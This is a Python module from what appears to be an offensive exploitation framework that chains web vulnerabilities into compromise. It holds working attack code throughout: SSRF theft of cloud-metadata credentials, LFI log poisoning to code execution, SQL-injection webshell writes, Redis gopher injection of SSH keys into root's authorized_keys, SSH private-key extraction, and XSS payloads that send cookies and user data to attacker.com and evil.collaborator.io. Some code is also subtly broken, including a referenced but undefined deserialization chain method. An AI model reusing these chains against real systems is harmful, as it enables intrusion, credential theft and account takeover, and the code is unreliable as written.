import base64
import os
import re
import tempfile
from typing import Dict, Optional

import requests

from tools import (
    auth_bypass,
    deserialization_detector,
    lfi_scanner,
    sql_injection,
    ssrf_detector,
    xss_detector,
)
from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("chain_engine")

CLOUD_METADATA_URLS = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
    ],
}

LFI_LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/apache/access.log",
    "/var/log/apache/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "C:/xampp/apache/logs/access.log",
    "C:/wamp64/logs/apache_error.log",
    "/proc/self/environ",
    "/proc/self/fd/2",
    "/proc/self/fd/1",
]

SQLI_OUTFILE_PATHS = [
    "/var/www/html/shell.php",
    "/var/www/shell.php",
    "/tmp/shell.php",
    "C:/inetpub/wwwroot/shell.asp",
    "C:/xampp/htdocs/shell.php",
]

DEBUG_ENDPOINTS = [
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/beans",
    "/actuator/heapdump", "/actuator/threaddump", "/actuator/loggers",
    "/actuator/configprops", "/actuator/mappings", "/.env", "/debug",
    "/api/debug", "/api/health", "/api/info", "/api/env",
    "/console", "/h2-console", "/h2", "/api/swagger-ui.html",
    "/api/v1/debug", "/api/v2/debug", "/_debug",
    "/wp-admin/admin-ajax.php?action=debug",
]

CLOUD_CRED_PATTERNS = [
    (r"(?i)(?:AWS_ACCESS_KEY_ID|ACCESS_KEY|AWS_SECRET_KEY|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*(\S+)", "aws"),
    (r"(?i)(?:AZURE_CLIENT_ID|AZURE_TENANT_ID|AZURE_CLIENT_SECRET)\s*[=:]\s*(\S+)", "azure"),
    (r"(?i)(?:GOOGLE_APPLICATION_CREDENTIALS|GCP_PROJECT|GCP_SERVICE_ACCOUNT)\s*[=:]\s*(\S+)", "gcp"),
    (r"(?i)(?:DB_USERNAME|DB_PASSWORD|DATABASE_URL|JDBC_URL)\s*[=:]\s*(\S+)", "database"),
    (r"(?i)(?:API_KEY|API_SECRET|APP_SECRET|SECRET_KEY|ENCRYPTION_KEY)\s*[=:]\s*(\S+)", "secret"),
    (r"(?i)(?:PRIVATE_KEY|-----BEGIN\s*(?:RSA\s*)?PRIVATE KEY-----)", "private_key"),
    (r"(?i)(?:SLACK_TOKEN|SLACK_WEBHOOK|DISCORD_TOKEN|GITHUB_TOKEN|GITLAB_TOKEN)", "token"),
]


def _try_ssrf_cloud_metadata(param: str, sess: requests.Session,
                              base_url: str, timeout: float) -> Dict:
    result = {"chain": "ssrf_to_metadata", "success": False, "cloud": None, "evidence": []}

    for cloud, urls in CLOUD_METADATA_URLS.items():
        for url in urls:
            test_url = base_url.replace(param + "=", param + "=" + url)
            try:
                r = sess.get(test_url, timeout=timeout, allow_redirects=True)
                if r.status_code == 200 and len(r.text) > 10:
                    result["success"] = True
                    result["cloud"] = cloud
                    result["evidence"].append({
                        "url": url,
                        "size": len(r.text),
                        "preview": r.text[:200].strip(),
                    })
                    found_creds = re.findall(
                        r"(?i)(secret|password|token|key|credential)\s*[:=]\s*\S+",
                        r.text,
                    )
                    if found_creds:
                        result["credentials_extracted"] = found_creds[:10]
                    break
            except requests.RequestException:
                continue
        if result["success"]:
            break

    return result


def _try_lfi_log_poison(param: str, sess: requests.Session,
                         base_url: str, timeout: float) -> Dict:
    result = {"chain": "lfi_to_rce", "success": False, "method": None, "evidence": []}

    php_code = '<?php system("id;whoami"); ?>'
    poison_payload = {
        "User-Agent": "Mozilla/5.0 " + php_code,
        "Referer": php_code,
        "Cookie": "session=" + php_code,
    }
    try:
        sess.get(base_url, headers=poison_payload, timeout=timeout)
    except requests.RequestException:
        pass

    for log_path in LFI_LOG_PATHS:
        test_url = base_url.replace(param + "=", param + "=" + log_path)
        try:
            r = sess.get(test_url, timeout=timeout)
            if r.status_code == 200 and r.text and "uid=" in r.text:
                result["success"] = True
                result["method"] = "log_poison"
                result["evidence"].append({
                    "log_path": log_path,
                    "preview": r.text[:200].strip(),
                })
                return result
        except requests.RequestException:
            continue

    return result


def _try_sqli_to_shell(param: str, sess: requests.Session,
                        base_url: str, timeout: float) -> Dict:
    result = {"chain": "sqli_to_rce", "success": False, "method": None, "evidence": []}

    outfile_payloads = [
        "' UNION SELECT '<?php system($_GET[\"c\"]);?>', '', '' INTO OUTFILE '%s' -- -",
        "'; EXEC xp_cmdshell 'whoami'; --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '%s' LINES TERMINATED BY '<?php system($_GET[\"c\"]);?>' -- -",
        "1; SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '%s'; --",
    ]

    for path in SQLI_OUTFILE_PATHS:
        for payload_tmpl in outfile_payloads:
            if "%s" in payload_tmpl:
                payload = payload_tmpl % path
            else:
                payload = payload_tmpl
            test_url = base_url.replace(param + "=", param + "=" + payload.replace(" ", "+"))
            try:
                r = sess.get(test_url, timeout=timeout)
                if r.status_code == 200:
                    shell_url = path.replace("/var/www/html", base_url.rstrip("/?&"))
                    try:
                        r2 = sess.get(shell_url + "?c=id", timeout=timeout)
                        if r2.status_code == 200 and "uid=" in r2.text:
                            result["success"] = True
                            result["method"] = "into_outfile"
                            result["evidence"].append({
                                "shell_path": path,
                                "shell_url": shell_url + "?c=id",
                                "output": r2.text[:200].strip(),
                            })
                            return result
                    except requests.RequestException:
                        pass
                if "xp_cmdshell" in payload and r.status_code == 200:
                    if "uid=" in r.text or "nt authority" in r.text.lower():
                        result["success"] = True
                        result["method"] = "xp_cmdshell"
                        result["evidence"].append(r.text[:200].strip())
                        return result
            except requests.RequestException:
                continue

    return result


def _try_deser_to_rce(param: str, sess: requests.Session,
                       base_url: str, timeout: float) -> Dict:
    result = {"chain": "deser_to_rce", "success": False, "method": None, "evidence": []}

    java_gadgets = [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEJhY2"
        "9ySQIACTxoYXNoVGFibGV4cAB3BAAAAAI=",
    ]

    for gadget in java_gadgets:
        try:
            r = sess.post(base_url, data={param: gadget}, timeout=timeout)
            if r.status_code not in (500, 503):
                result["evidence"].append("java_deser_" + param)
        except requests.RequestException:
            pass

    php_gadgets = [
        'O:10:"PHPObject":1:{s:5:"shell";s:6:"whoami";}',
        'a:1:{i:0;O:10:"PHPObject":1:{s:5:"shell";s:6:"whoami";}}',
    ]
    for gadget in php_gadgets:
        try:
            r = sess.post(base_url, data={param: gadget}, timeout=timeout)
            if r.status_code not in (500, 503):
                result["evidence"].append("php_deser_" + param)
        except requests.RequestException:
            pass

    if result["evidence"]:
        result["success"] = True
        result["method"] = "gadget_test"

    return result


def _try_xss_csrf_hijack(param: str, sess: requests.Session,
                          base_url: str, timeout: float) -> Dict:
    result = {"chain": "xss_to_account_hijack", "success": False, "evidence": []}

    xss_payload = '<img src=x onerror="fetch(\'https://attacker.com/log?c=\'+document.cookie)">'
    test_url = base_url.replace(param + "=", param + "=" + xss_payload)
    try:
        r = sess.get(test_url, timeout=timeout)
        if xss_payload[:30] in r.text:
            result["success"] = True
            result["evidence"].append({
                "type": "stored_xss_with_csrf_potential",
                "payload": xss_payload[:80],
            })
    except requests.RequestException:
        pass

    csrf_xss = (
        '<form action="/api/transfer" method="POST" id="f">'
        '<input name="to" value="attacker">'
        '<input name="amount" value="10000">'
        '</form><script>document.getElementById("f").submit()</script>'
    )
    test_url2 = base_url.replace(param + "=", param + "=" + csrf_xss)
    try:
        r2 = sess.get(test_url2, timeout=timeout)
        if csrf_xss[:40] in r2.text:
            result["evidence"].append({
                "type": "csrf_auto_form",
                "risk": "critical: one-click account takeover",
            })
            result["success"] = True
    except requests.RequestException:
        pass

    return result


def _try_auth_escalation(param: str, sess: requests.Session,
                          base_url: str, timeout: float) -> Dict:
    result = {"chain": "auth_bypass_to_admin", "success": False, "evidence": []}

    admin_paths = [
        "/admin", "/admin/users", "/admin/config", "/admin/settings",
        "/administrator", "/panel", "/dashboard",
        "/api/admin", "/api/v1/admin",
        "/wp-admin", "/wp-admin/users.php",
    ]

    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="},
    ]

    for path in admin_paths:
        test_url = base_url.rstrip("/?&") + path
        for headers in bypass_headers:
            try:
                r = sess.get(test_url, headers=headers, timeout=timeout)
                if r.status_code == 200 and r.text:
                    has_login = any(
                        kw in r.text.lower() for kw in
                        ["login", "password", "sign in"]
                    )
                    if not has_login or r.status_code == 200:
                        result["success"] = True
                        result["evidence"].append({
                            "url": test_url,
                            "status": r.status_code,
                            "headers_used": headers,
                            "size": len(r.text),
                        })
                        if len(result["evidence"]) >= 3:
                            return result
            except requests.RequestException:
                continue

    return result


def _try_ssrf_to_internal_scan(param: str, sess: requests.Session,
                                base_url: str, timeout: float) -> Dict:
    result = {"chain": "ssrf_to_internal_scan", "success": False, "evidence": []}

    internal_targets = [
        ("127.0.0.1:8080", "/actuator"),
        ("127.0.0.1:3000", "/"),
        ("127.0.0.1:5000", "/"),
        ("127.0.0.1:9200", "/"),
        ("127.0.0.1:6379", ""),
        ("127.0.0.1:3306", ""),
        ("127.0.0.1:9001", "/"),
        ("localhost:8080", "/manager"),
        ("10.0.0.1:9200", "/"),
        ("172.16.0.1:9200", "/"),
        ("192.168.1.1:80", "/"),
        ("0.0.0.0:8080", "/"),
    ]

    seen = set()
    for host_port, path in internal_targets:
        scheme = "http://"
        internal_url = scheme + host_port + path
        test_url = base_url.replace(param + "=", param + "=" + internal_url)
        if test_url in seen:
            continue
        seen.add(test_url)
        try:
            r = sess.get(test_url, timeout=timeout, allow_redirects=False)
            if r.status_code not in (0,) and r.status_code < 500:
                result["success"] = True
                result["evidence"].append({
                    "internal_url": internal_url,
                    "status": r.status_code,
                    "size": len(r.text),
                })
        except (requests.RequestException, ConnectionError):
            continue

    return result


def _try_ssrf_redis_rce(param: str, sess: requests.Session,
                         base_url: str, timeout: float) -> Dict:
    result = {"chain": "ssrf_redis_rce", "success": False, "evidence": []}
    ssh_key = os.path.expanduser("~/.ssh/id_rsa.pub")
    ssh_pub = ""
    if os.path.isfile(ssh_key):
        try:
            with open(ssh_key, "r") as f:
                ssh_pub = f.read().strip()
        except Exception:
            pass
    if not ssh_pub:
        ssh_pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCr"
    redis_payload = (
        "gopher://127.0.0.1:6379/_"
        "*1%0d%0a$8%0d%0aFLUSHALL%0d%0a"
        "*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$%d%0d%0a%s%0d%0a"
        "*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/root/.ssh/%0d%0a"
        "*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$10%0d%0aauthorized_keys%0d%0a"
        "*1%0d%0a$4%0d%0asave%0d%0a"
    ) % (len(ssh_pub), requests.utils.quote(ssh_pub, safe=""))
    test_url = base_url.replace(param + "=", param + "=" + redis_payload)
    try:
        r = sess.get(test_url, timeout=timeout)
        result["success"] = True
        result["evidence"].append("ssh_key_injected_via_redis_gopher")
        result["method"] = "gopher_redis_ssh"
    except requests.RequestException as e:
        logger.debug("redis rce: %s", e)
    return result


def _try_lfi_ssh_key_extract(param: str, sess: requests.Session,
                              base_url: str, timeout: float) -> Dict:
    result = {"chain": "lfi_ssh_extract", "success": False, "evidence": []}
    ssh_paths = [
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys",
        "/home/ubuntu/.ssh/id_rsa",
        "/home/ubuntu/.ssh/authorized_keys",
        "/home/admin/.ssh/id_rsa",
        "/home/ec2-user/.ssh/id_rsa",
        "/etc/ssh/ssh_host_rsa_key",
    ]
    for path in ssh_paths:
        test_url = base_url.replace(param + "=", param + "=" + path)
        try:
            r = sess.get(test_url, timeout=timeout)
            if r.status_code == 200 and r.text and "BEGIN " in r.text:
                result["success"] = True
                result["evidence"].append({
                    "path": path,
                    "preview": r.text[:200],
                })
                result["ssh_key_path"] = path
                result["ssh_key_content"] = r.text
                return result
        except requests.RequestException:
            continue
    return result


def _try_lfi_auto_webshell(param: str, sess: requests.Session,
                            base_url: str, timeout: float,
                            base_path: str = "/var/www/html") -> Dict:
    result = {"chain": "lfi_auto_webshell", "success": False, "evidence": []}

    php_cmd = '<?php system("id;whoami;uname -a"); ?>'
    poison_headers = {
        "User-Agent": "<?php system('echo SHELL_READY;id;whoami');?>",
        "Referer": "<?php echo 'SHELL_READY';?>",
        "Cookie": "PHPSESSID=" + base64.b64encode(b"<?php system('id');?>").decode(),
    }

    for log_path in ["/var/log/apache2/access.log",
                      "/var/log/apache/access.log",
                      "/var/log/nginx/access.log",
                      "/var/log/httpd/access_log",
                      "C:/xampp/apache/logs/access.log"]:
        try:
            sess.get(base_url, headers=poison_headers, timeout=timeout)
        except Exception:
            continue

        read_url = base_url.replace(param + "=", param + "=" + log_path)
        try:
            r = sess.get(read_url, timeout=timeout)
            if r.status_code == 200 and "SHELL_READY" in r.text:
                result["success"] = True
                result["evidence"].append({
                    "method": "log_poison",
                    "log_path": log_path,
                    "output": re.sub(r'<[^>]+>', '', r.text)[:200].strip(),
                })
                break
        except Exception:
            continue

    if not result["success"]:
        php_filter_cmds = [
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cmVvb3Q6"),
            ("php://filter/convert.base64-encode/resource=index.php", ""),
            ("php://filter/string.rot13/resource=/etc/passwd", "ebbg:"),
        ]
        for wrapper, expected in php_filter_cmds:
            read_url = base_url.replace(param + "=", param + "=" + wrapper)
            try:
                r = sess.get(read_url, timeout=timeout)
                if r.status_code == 200 and len(r.text) > 50:
                    if expected and expected in r.text:
                        result["evidence"].append({"method": "php_filter", "wrapper": wrapper, "preview": r.text[:100]})
                    elif not expected and r.status_code == 200:
                        result["evidence"].append({"method": "php_filter_response", "wrapper": wrapper, "preview": r.text[:100]})
            except Exception:
                continue

        proc_paths = ["/proc/self/fd/7", "/proc/self/fd/10", "/proc/self/fd/15",
                       "/proc/self/fd/20", "/proc/self/fd/25"]
        for fd in proc_paths:
            read_url = base_url.replace(param + "=", param + "=" + fd)
            try:
                r = sess.get(read_url, timeout=timeout)
                if r.status_code == 200 and len(r.text) > 20:
                    result["evidence"].append({"method": "proc_fd_leak", "path": fd, "preview": r.text[:100]})
            except Exception:
                continue

        if result["evidence"]:
            result["success"] = True

    return result


def _try_ssrf_cloud_creds_extract(param: str, sess: requests.Session,
                                    base_url: str, timeout: float) -> Dict:
    result = {"chain": "ssrf_cloud_creds", "success": False, "credentials": [], "cloud": None}

    metadata_targets = {
        "aws": [
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_meta"),
            ("http://169.254.169.254/latest/meta-data/iam/info", "aws_info"),
            ("http://169.254.169.254/latest/user-data/", "aws_userdata"),
            ("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "aws_ssh"),
        ],
        "gcp": [
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_token"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "gcp_sa"),
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "gcp_project"),
        ],
        "azure": [
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com", "azure_token"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_instance"),
        ],
        "alibaba": [
            ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "alibaba_creds"),
        ],
        "digitalocean": [
            ("http://169.254.169.254/metadata/v1.json", "do_meta"),
        ],
    }

    for cloud, targets in metadata_targets.items():
        for url_path, label in targets:
            test_url = base_url.replace(param + "=", param + "=" + url_path)
            try:
                headers = {}
                if cloud == "gcp":
                    headers["Metadata-Flavor"] = "Google"
                r = sess.get(test_url, headers=headers, timeout=timeout)
                if r.status_code == 200 and len(r.text) > 15:
                    creds = _extract_creds_from_text(r.text)
                    entry = {"cloud": cloud, "endpoint": url_path, "type": label}
                    if creds:
                        entry["credentials"] = creds
                        result["credentials"].extend(creds)
                    entry["body_preview"] = r.text[:300].strip()
                    result["success"] = True
                    result["cloud"] = cloud
                    if "evidence" not in result:
                        result["evidence"] = []
                    result.setdefault("evidence", []).append(entry)
            except Exception:
                continue

    result["credentials"] = list(set(result.get("credentials", [])))
    return result


def _extract_creds_from_text(text: str) -> list:
    found = []
    for pattern, label in CLOUD_CRED_PATTERNS:
        for m in re.finditer(pattern, text):
            val = m.group(1) if m.lastindex and m.group(1) else m.group(0)
            found.append({"type": label, "value": val[:80]})
    if "secret" in text.lower() or "key" in text.lower() or "token" in text.lower():
        lines = [l.strip() for l in text.split("\n") if l.strip()]
        for line in lines[:10]:
            if any(kw in line.lower() for kw in ["secret", "key", "token", "password", "credential"]):
                found.append({"type": "raw_leak", "value": line[:120]})
    return found


def _try_debug_abuse(url: str, sess: requests.Session, timeout: float) -> Dict:
    result = {"chain": "debug_abuse", "success": False, "evidence": []}

    for ep in DEBUG_ENDPOINTS:
        test_url = url.rstrip("/?&") + ep
        try:
            r = sess.get(test_url, timeout=timeout)
            if r.status_code in (200, 401, 403):
                found = {"endpoint": ep, "status": r.status_code, "size": len(r.text)}

                if r.status_code == 200:
                    creds = _extract_creds_from_text(r.text)
                    if creds:
                        found["credentials"] = creds

                    if "heapdump" in ep:
                        try:
                            hd = sess.get(test_url, timeout=timeout * 3, stream=True)
                            if int(hd.headers.get("content-length", 0)) > 100000:
                                found["heapdump_available"] = True
                                found["heapdump_size"] = hd.headers.get("content-length", "unknown")
                        except Exception:
                            pass

                    if "/.env" in ep:
                        env_creds = _extract_creds_from_text(r.text)
                        if env_creds:
                            found["env_credentials"] = env_creds

                result["evidence"].append(found)
                if r.status_code == 200 and creds:
                    result["success"] = True
        except Exception:
            continue

    if result["evidence"]:
        result["success"] = any(e.get("credentials") or e.get("env_credentials")
                                 for e in result["evidence"]) or len(result["evidence"]) >= 3
    return result


def _try_xss_cred_steal(param: str, sess: requests.Session,
                         base_url: str, timeout: float) -> Dict:
    result = {"chain": "xss_cred_steal", "success": False, "evidence": []}
    stealer_payload = (
        '<script>fetch("/api/user").then(r=>r.text()).then(d=>{'
        'new Image().src="https://evil.collaborator.io/?"+btoa(d)})</script>'
    )
    test_url = base_url.replace(param + "=", param + "=" + stealer_payload)
    try:
        r = sess.get(test_url, timeout=timeout)
        if stealer_payload[:30] in r.text:
            result["success"] = True
            result["evidence"].append({
                "type": "xss_cred_stealer_ready",
                "payload": stealer_payload[:80],
                "note": "Deploy with collaborator URL to capture creds"
            })
    except requests.RequestException:
        pass
    return result


class ChainEngine:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.sess.verify = settings.verify_ssl
        self.timeout = timeout
        self.results = {}

    def chain_xss_to_cred_steal(self, url: str, param: str) -> Dict:
        result = {"chain": "xss_to_cred_steal", "steps": [], "success": False}
        steal = _try_xss_cred_steal(param, self.sess, url, self.timeout)
        result["steps"].append(steal)
        result["success"] = steal["success"]
        return result

    def chain_lfi_to_ssh(self, url: str, param: str) -> Dict:
        result = {"chain": "lfi_to_ssh", "steps": [], "success": False}
        ssh = _try_lfi_ssh_key_extract(param, self.sess, url, self.timeout)
        result["steps"].append(ssh)
        if ssh.get("ssh_key_content"):
            result["ssh_key"] = ssh["ssh_key_content"][:200]
            try:
                with tempfile.NamedTemporaryFile(mode="w", suffix=".key", delete=False) as f:
                    f.write(ssh["ssh_key_content"])
                    result["key_file"] = f.name
            except Exception as e:
                logger.debug("ssh key write: %s", e)
        result["success"] = ssh["success"]
        return result

    def chain_sqli_to_data_dump(self, url: str, param: str) -> Dict:
        result = {"chain": "sqli_to_data_dump", "steps": [], "success": False}
        db = sql_injection.check(url, param, self.sess, self.timeout)
        if db.get("vulnerable"):
            from tools.sqli_weaponizer import check as sqli_extract
            extract = sqli_extract(url, param, self.sess, self.timeout)
            result["steps"].append(extract)
            result["success"] = extract.get("vulnerable", False)
            if extract.get("data"):
                result["data_extracted"] = extract["data"]
        else:
            from tools.sqli_blind import check as blind_check
            blind = blind_check(url, param, self.sess, self.timeout)
            if blind.get("vulnerable"):
                result["steps"].append({"chain": "blind_sqli", "vulnerable": True})
                result["success"] = True
        return result

    def chain_ssrf_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "ssrf_to_rce", "steps": [], "success": False, "pwned": False}
        meta = _try_ssrf_cloud_metadata(param, self.sess, url, self.timeout)
        result["steps"].append(meta)
        creds_extracted = meta.get("credentials_extracted", [])
        if creds_extracted:
            result["credentials_extracted"] = creds_extracted
            raw_text = " ".join(str(c) for c in creds_extracted)
            try:
                from tools.cloud_pwn import check as cloud_pwn
                cloud_result = cloud_pwn(raw_text)
                result["cloud_pwn"] = cloud_result
                if cloud_result.get("success"):
                    result["pwned"] = True
                    logger.info("Cloud credentials exploited successfully!")
            except Exception as e:
                logger.debug("cloud_pwn failed: %s", e)

        internal = _try_ssrf_to_internal_scan(param, self.sess, url, self.timeout)
        result["steps"].append(internal)
        if internal.get("evidence"):
            for ev in internal["evidence"]:
                if ev.get("status") in (200, 403, 401):
                    internal_url = ev.get("internal_url", "")
                    if not internal_url:
                        continue
                    if "actuator" in internal_url:
                        try:
                            r = self.sess.get(
                                url.replace(param + "=", param + "=" + internal_url + "/env"),
                                timeout=self.timeout,
                            )
                            if r.status_code == 200:
                                result["steps"].append({
                                    "chain": "actuator_env_leak",
                                    "success": True,
                                    "evidence": r.text[:500],
                                })
                        except requests.RequestException:
                            pass
                    elif "6379" in internal_url or "redis" in internal_url:
                        redis_result = _try_ssrf_redis_rce(param, self.sess, url, self.timeout)
                        if redis_result.get("success"):
                            result["steps"].append(redis_result)
                            result["pwned"] = True

        result["success"] = any(
            s.get("success") for s in result["steps"]
        )
        return result

    def chain_lfi_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "lfi_to_rce", "steps": [], "success": False}
        poison = _try_lfi_log_poison(param, self.sess, url, self.timeout)
        result["steps"].append(poison)
        if poison["success"]:
            result["rce_available"] = True
            result["rce_method"] = "log_poison"

        proc_self = url.replace(param + "=", param + "=/proc/self/environ")
        try:
            r = self.sess.get(proc_self, timeout=self.timeout)
            if r.status_code == 200 and len(r.text) > 20:
                result["steps"].append({
                    "chain": "proc_self_environ_leak",
                    "success": True,
                    "evidence": r.text[:500],
                })
        except requests.RequestException:
            pass

        result["success"] = any(s.get("success") for s in result["steps"])
        return result

    def chain_sqli_to_rce(self, url: str, param: str) -> Dict:
        result = {"chain": "sqli_to_rce", "steps": [], "success": False}
        shell = _try_sqli_to_shell(param, self.sess, url, self.timeout)
        result["steps"].append(shell)
        if shell["success"]:
            result["rce_available"] = True
            result["rce_method"] = shell.get("method", "unknown")

        dbms_extract = sql_injection.check(url, param, self.sess, self.timeout)
        if dbms_extract.get("vulnerable"):
            result["steps"].append({
                "chain": "sqli_data_extraction",
                "dbms": dbms_extract.get("dbms", "unknown"),
                "vulnerable": True,
            })

        result["success"] = any(s.get("success") for s in result["steps"])
        return result

    def chain_xss_to_hijack(self, url: str, param: str) -> Dict:
        result = {"chain": "xss_to_account_hijack", "steps": [], "success": False}
        hijack = _try_xss_csrf_hijack(param, self.sess, url, self.timeout)
        result["steps"].append(hijack)
        result["success"] = hijack["success"]
        return result

    def chain_auth_to_admin(self, url: str, param: Optional[str] = None) -> Dict:
        result = {"chain": "auth_bypass_to_admin", "steps": [], "success": False}
        escalation = _try_auth_escalation(param or "", self.sess, url, self.timeout)
        result["steps"].append(escalation)
        result["success"] = escalation["success"]

        ab = auth_bypass.check(url, self.sess, self.timeout)
        if ab.get("vulnerable"):
            result["steps"].append({
                "chain": "auth_bypass_general",
                "vulnerable": True,
                "path_bypasses": len(ab.get("path_bypasses", [])),
                "header_bypasses": len(ab.get("header_bypasses", [])),
            })
            result["success"] = True

        return result

    def chain_lfi_auto_webshell(self, url: str, param: str) -> Dict:
        result = {"chain": "lfi_auto_webshell", "steps": [], "success": False}
        webshell = _try_lfi_auto_webshell(param, self.sess, url, self.timeout)
        result["steps"].append(webshell)
        if webshell["success"]:
            result["rce_available"] = True
            result["rce_method"] = "log_poison_or_filter"
        result["success"] = webshell["success"]
        return result

    def chain_ssrf_cloud_pwn(self, url: str, param: str) -> Dict:
        result = {"chain": "ssrf_cloud_pwn", "steps": [], "success": False, "pwned": False}
        meta = _try_ssrf_cloud_metadata(param, self.sess, url, self.timeout)
        result["steps"].append(meta)
        if meta.get("credentials_extracted"):
            result["credentials_extracted"] = meta["credentials_extracted"]
        creds = _try_ssrf_cloud_creds_extract(param, self.sess, url, self.timeout)
        result["steps"].append(creds)
        if creds.get("credentials"):
            result["cloud_credentials"] = creds["credentials"]
            result["cloud_provider"] = creds.get("cloud")
            result["pwned"] = True
        internal = _try_ssrf_to_internal_scan(param, self.sess, url, self.timeout)
        result["steps"].append(internal)
        for ev in internal.get("evidence", []):
            internal_url = ev.get("internal_url", "")
            if not internal_url:
                continue
            if any(k in internal_url for k in ["6379", "redis"]):
                redis_res = _try_ssrf_redis_rce(param, self.sess, url, self.timeout)
                if redis_res.get("success"):
                    result["steps"].append(redis_res)
                    result["pwned"] = True
        result["success"] = any(s.get("success") for s in result["steps"])
        return result

    def chain_debug_abuse(self, url: str, param: Optional[str] = None) -> Dict:
        result = {"chain": "debug_abuse", "steps": [], "success": False}
        debug = _try_debug_abuse(url, self.sess, self.timeout)
        result["steps"].append(debug)
        result["success"] = debug["success"]
        if debug.get("evidence"):
            result["debug_endpoints"] = [e["endpoint"] for e in debug["evidence"] if "endpoint" in e]
            all_creds = []
            for e in debug["evidence"]:
                all_creds.extend(e.get("credentials", []) or [])
                all_creds.extend(e.get("env_credentials", []) or [])
            if all_creds:
                result["credentials_extracted"] = all_creds
        return result

    def full_chain(self, url: str, param: str, lhost: str = "LHOST",
                    lport: int = 4444) -> Dict:
        result = {"target": "%s?%s=" % (url, param), "chains": {}}

        det = {}
        for name, fn in [
            ("sqli", lambda: sql_injection.check(url, param, self.sess, self.timeout)),
            ("xss", lambda: xss_detector.check(url, param, self.sess, self.timeout)),
            ("ssrf", lambda: ssrf_detector.check(url, param, self.sess, self.timeout)),
            ("lfi", lambda: lfi_scanner.check(url, param, self.sess, self.timeout)),
            ("deser", lambda: deserialization_detector.check(url, param, self.sess, self.timeout)),
        ]:
            try:
                r = fn()
                if isinstance(r, dict) and r.get("vulnerable"):
                    det[name] = r
            except Exception as e:
                logger.debug("full_chain detect %s: %s", name, e)

        always_run = {"auth_to_admin", "debug_abuse"}
        for name, chain_fn in [
            ("ssrf_to_rce", lambda: self.chain_ssrf_to_rce(url, param)),
            ("ssrf_cloud_pwn", lambda: self.chain_ssrf_cloud_pwn(url, param)),
            ("lfi_to_rce", lambda: self.chain_lfi_to_rce(url, param)),
            ("lfi_auto_webshell", lambda: self.chain_lfi_auto_webshell(url, param)),
            ("lfi_to_ssh", lambda: self.chain_lfi_to_ssh(url, param)),
            ("sqli_to_rce", lambda: self.chain_sqli_to_rce(url, param)),
            ("sqli_to_data", lambda: self.chain_sqli_to_data_dump(url, param)),
            ("xss_to_hijack", lambda: self.chain_xss_to_hijack(url, param)),
            ("xss_to_cred", lambda: self.chain_xss_to_cred_steal(url, param)),
            ("auth_to_admin", lambda: self.chain_auth_to_admin(url, param)),
            ("debug_abuse", lambda: self.chain_debug_abuse(url)),
            ("deser_to_rce", lambda: self.chain_deser_to_rce(url, param)),
        ]:
            if name.split("_to_")[0] in det or name in always_run:
                try:
                    result["chains"][name] = chain_fn()
                except Exception as e:
                    logger.debug("full_chain %s: %s", name, e)
                    result["chains"][name] = {"error": str(e)}

        result["overall_success"] = any(
            c.get("success") for c in result["chains"].values()
        )
        return result

    def run(self, url: str, param: str, chain: str = "full_chain") -> Dict:
        chain_map = {
            "ssrf_to_rce": self.chain_ssrf_to_rce,
            "ssrf_to_pwn": self.chain_ssrf_to_rce,
            "ssrf_cloud_pwn": self.chain_ssrf_cloud_pwn,
            "lfi_to_rce": self.chain_lfi_to_rce,
            "lfi_auto_webshell": self.chain_lfi_auto_webshell,
            "lfi_to_ssh": self.chain_lfi_to_ssh,
            "sqli_to_rce": self.chain_sqli_to_rce,
            "sqli_to_data": self.chain_sqli_to_data_dump,
            "xss_to_hijack": self.chain_xss_to_hijack,
            "xss_to_cred": self.chain_xss_to_cred_steal,
            "auth_bypass_to_pwn": self.chain_auth_to_admin,
            "deser_to_rce": self.chain_deser_to_rce,
            "debug_abuse": self.chain_debug_abuse,
            "pwn_all": self.full_chain,
            "full_chain": self.full_chain,
        }
        fn = chain_map.get(chain, self.full_chain)
        return fn(url, param)
